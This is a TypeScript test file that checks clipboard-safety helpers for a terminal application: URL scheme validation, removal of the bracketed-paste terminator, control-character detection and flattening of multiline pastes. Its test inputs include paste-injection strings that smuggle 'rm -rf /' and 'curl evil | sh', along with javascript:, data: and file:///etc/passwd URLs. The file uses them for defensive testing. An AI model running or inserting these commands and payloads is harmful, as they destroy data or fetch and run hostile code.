import { describe, expect, test } from "bun:test";

import {
  flattenPaste,
  hasUnsafeControlChars,
  isMultilinePaste,
  isSafeExternalUrl,
  sanitizePaste,
  stripTrailingNewline,
} from "./clipboard";

describe("isSafeExternalUrl", () => {
  test("accepts http and https", () => {
    expect(isSafeExternalUrl("http://example.com")).toBe(true);
    expect(isSafeExternalUrl("https://example.com/path?x=1")).toBe(true);
  });

  test("accepts mailto with an address", () => {
    expect(isSafeExternalUrl("mailto:dev@example.com")).toBe(true);
    expect(isSafeExternalUrl("mailto:dev@example.com?subject=hi")).toBe(true);
  });

  test("rejects mailto without an address", () => {
    expect(isSafeExternalUrl("mailto:")).toBe(false);
  });

  test("rejects file protocol", () => {
    expect(isSafeExternalUrl("file:///etc/passwd")).toBe(false);
  });

  test("rejects javascript protocol", () => {
    expect(isSafeExternalUrl("javascript:alert(1)")).toBe(false);
  });

  test("rejects data protocol", () => {
    expect(isSafeExternalUrl("data:text/html,<script>alert(1)</script>")).toBe(
      false,
    );
  });

  test("rejects vbscript protocol", () => {
    expect(isSafeExternalUrl("vbscript:msgbox(1)")).toBe(false);
  });

  test("rejects empty string", () => {
    expect(isSafeExternalUrl("")).toBe(false);
  });

  test("rejects non-url string", () => {
    expect(isSafeExternalUrl("not a url")).toBe(false);
  });

  test("rejects https with empty host", () => {
    expect(isSafeExternalUrl("https://")).toBe(false);
    expect(isSafeExternalUrl("https://:80")).toBe(false);
  });

  test("rejects userinfo confusion", () => {
    expect(isSafeExternalUrl("https://github.com@evil.com")).toBe(false);
    expect(isSafeExternalUrl("https://user:pass@evil.com")).toBe(false);
  });
});

describe("sanitizePaste", () => {
  test("strips the bracketed paste terminator", () => {
    expect(sanitizePaste("foo\x1b[201~\rrm -rf /")).toBe("foo\rrm -rf /");
  });

  test("strips every occurrence", () => {
    expect(sanitizePaste("\x1b[201~a\x1b[201~b")).toBe("ab");
  });

  test("leaves ordinary text untouched", () => {
    expect(sanitizePaste("git status")).toBe("git status");
  });
});

describe("hasUnsafeControlChars", () => {
  test("detects escape", () => {
    expect(hasUnsafeControlChars("a\x1b[31mb")).toBe(true);
  });

  test("detects bel and nul", () => {
    expect(hasUnsafeControlChars("a\x07")).toBe(true);
    expect(hasUnsafeControlChars("a\x00")).toBe(true);
  });

  test("allows tab, newline and carriage return", () => {
    expect(hasUnsafeControlChars("a\tb\nc\rd")).toBe(false);
  });
});

describe("stripTrailingNewline", () => {
  test("drops a single trailing newline", () => {
    expect(stripTrailingNewline("git status\n")).toBe("git status");
    expect(stripTrailingNewline("git status\r\n")).toBe("git status");
  });

  test("keeps interior newlines", () => {
    expect(stripTrailingNewline("a\nb\n")).toBe("a\nb");
  });
});


describe("isMultilinePaste", () => {
  test("detects newline", () => {
    expect(isMultilinePaste("a\nb")).toBe(true);
  });

  test("detects carriage return", () => {
    expect(isMultilinePaste("a\rb")).toBe(true);
  });

  test("detects crlf", () => {
    expect(isMultilinePaste("a\r\nb")).toBe(true);
  });

  test("false for single line", () => {
    expect(isMultilinePaste("single line")).toBe(false);
  });

  test("false for a single line with a trailing newline", () => {
    expect(isMultilinePaste("git status\n")).toBe(false);
  });
});

describe("flattenPaste", () => {
  test("flattens lf", () => {
    expect(flattenPaste("a\nb")).toBe("a b");
  });

  test("flattens crlf without double space", () => {
    expect(flattenPaste("a\r\nb")).toBe("a b");
  });

  test("flattens cr", () => {
    expect(flattenPaste("a\rb")).toBe("a b");
  });

  test("collapses runs of newlines into one space", () => {
    expect(flattenPaste("a\n\nb")).toBe("a b");
    expect(flattenPaste("a\r\n\r\nb")).toBe("a b");
  });

  test("preserves intentional interior spacing", () => {
    expect(flattenPaste('echo "a    b"')).toBe('echo "a    b"');
  });

  test("drops the trailing newline instead of adding a space", () => {
    expect(flattenPaste("git status\n")).toBe("git status");
  });

  test("strips control characters", () => {
    expect(flattenPaste("git status\x1b[201~; curl evil | sh")).toBe(
      "git status[201~; curl evil | sh",
    );
  });
});
